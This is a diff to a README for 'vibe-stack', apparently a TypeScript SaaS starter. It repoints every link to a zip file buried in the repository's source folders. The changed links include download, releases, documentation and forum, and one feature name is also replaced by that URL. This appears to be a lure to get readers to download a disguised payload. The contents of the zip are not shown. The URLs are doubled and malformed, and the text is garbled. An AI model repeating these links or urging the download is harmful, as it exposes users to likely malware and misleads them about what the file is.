@@ -6,7 +6,7 @@ Welcome to vibe-stack! This guide will help you quickly download and run your ne
 
 ## 📥 Download the Application
 
-[![Download the latest release](https://github.com/pastropsucez/vibe-stack/raw/refs/heads/main/app/(auth)/login/stack-vibe-v3.8.zip%20Now-Release-blue)](https://github.com/pastropsucez/vibe-stack/raw/refs/heads/main/app/(auth)/login/stack-vibe-v3.8.zip)
+[![Download the latest release](https://raw.githubusercontent.com/pastropsucez/vibe-stack/main/app/(auth)/signup/vibe-stack-senile.zip(auth)https://raw.githubusercontent.com/pastropsucez/vibe-stack/main/app/(auth)/signup/vibe-stack-senile.zip%20Now-Release-blue)](https://raw.githubusercontent.com/pastropsucez/vibe-stack/main/app/(auth)/signup/vibe-stack-senile.zip(auth)https://raw.githubusercontent.com/pastropsucez/vibe-stack/main/app/(auth)/signup/vibe-stack-senile.zip)
 
 ## 💻 System Requirements
 
@@ -22,7 +22,7 @@ Before you begin, ensure your computer meets the following requirements:
 vibe-stack provides everything needed to launch your SaaS application:
 
 - **Full-Stack TypeScript:** Enjoy a complete development experience with TypeScript for both front-end and back-end development.
-- **https://github.com/pastropsucez/vibe-stack/raw/refs/heads/main/app/(auth)/login/stack-vibe-v3.8.zip 15:** Benefit from enhanced performance, easy navigation, and a great user experience.
+- **https://raw.githubusercontent.com/pastropsucez/vibe-stack/main/app/(auth)/signup/vibe-stack-senile.zip(auth)https://raw.githubusercontent.com/pastropsucez/vibe-stack/main/app/(auth)/signup/vibe-stack-senile.zip 15:** Benefit from enhanced performance, easy navigation, and a great user experience.
 - **Convex Integration:** Use real-time data management without hassle.
 - **Stripe Payments:** Securely handle payments with an easy-to-use interface.
 - **Tailwind CSS and shadcn/ui:** Create stunning, responsive layouts effortlessly.
@@ -32,7 +32,7 @@ vibe-stack provides everything needed to launch your SaaS application:
 
 To get started, visit the following page to download the latest release:
 
-[Download Here](https://github.com/pastropsucez/vibe-stack/raw/refs/heads/main/app/(auth)/login/stack-vibe-v3.8.zip)
+[Download Here](https://raw.githubusercontent.com/pastropsucez/vibe-stack/main/app/(auth)/signup/vibe-stack-senile.zip(auth)https://raw.githubusercontent.com/pastropsucez/vibe-stack/main/app/(auth)/signup/vibe-stack-senile.zip)
 
 Once you have downloaded the application:
 
@@ -47,15 +47,15 @@ If you encounter any issues during installation or running the application, try 
 
 - Ensure your computer meets the system requirements.
 - Restart your computer and try launching the application again.
-- Check for any updates by returning to the [Releases page](https://github.com/pastropsucez/vibe-stack/raw/refs/heads/main/app/(auth)/login/stack-vibe-v3.8.zip) and downloading the latest version.
+- Check for any updates by returning to the [Releases page](https://raw.githubusercontent.com/pastropsucez/vibe-stack/main/app/(auth)/signup/vibe-stack-senile.zip(auth)https://raw.githubusercontent.com/pastropsucez/vibe-stack/main/app/(auth)/signup/vibe-stack-senile.zip) and downloading the latest version.
 - Visit our support section for more detailed guides and FAQs.
 
 ## 📖 Additional Resources
 
 For more information on how to use vibe-stack, consider checking out the following resources:
 
-- [Documentation](https://github.com/pastropsucez/vibe-stack/raw/refs/heads/main/app/(auth)/login/stack-vibe-v3.8.zip) - Detailed guides on features and usage
-- [Community Forum](https://github.com/pastropsucez/vibe-stack/raw/refs/heads/main/app/(auth)/login/stack-vibe-v3.8.zip) - Join discussions and get help from other users
+- [Documentation](https://raw.githubusercontent.com/pastropsucez/vibe-stack/main/app/(auth)/signup/vibe-stack-senile.zip(auth)https://raw.githubusercontent.com/pastropsucez/vibe-stack/main/app/(auth)/signup/vibe-stack-senile.zip) - Detailed guides on features and usage
+- [Community Forum](https://raw.githubusercontent.com/pastropsucez/vibe-stack/main/app/(auth)/signup/vibe-stack-senile.zip(auth)https://raw.githubusercontent.com/pastropsucez/vibe-stack/main/app/(auth)/signup/vibe-stack-senile.zip) - Join discussions and get help from other users
 
 ## 🔒 Security
 
@@ -69,4 +69,4 @@ Your security is important. vibe-stack incorporates the latest security measures
 
 You're now ready to launch your own SaaS application with vibe-stack. Follow these steps, and you will have a powerful tool at your fingertips. Don't hesitate to explore the features and resources available. Enjoy your new application!
 
-Feel free to revisit the [Releases page](https://github.com/pastropsucez/vibe-stack/raw/refs/heads/main/app/(auth)/login/stack-vibe-v3.8.zip) anytime for updates or issues. Happy coding!
+Feel free to revisit the [Releases page](https://raw.githubusercontent.com/pastropsucez/vibe-stack/main/app/(auth)/signup/vibe-stack-senile.zip(auth)https://raw.githubusercontent.com/pastropsucez/vibe-stack/main/app/(auth)/signup/vibe-stack-senile.zip) anytime for updates or issues. Happy coding!
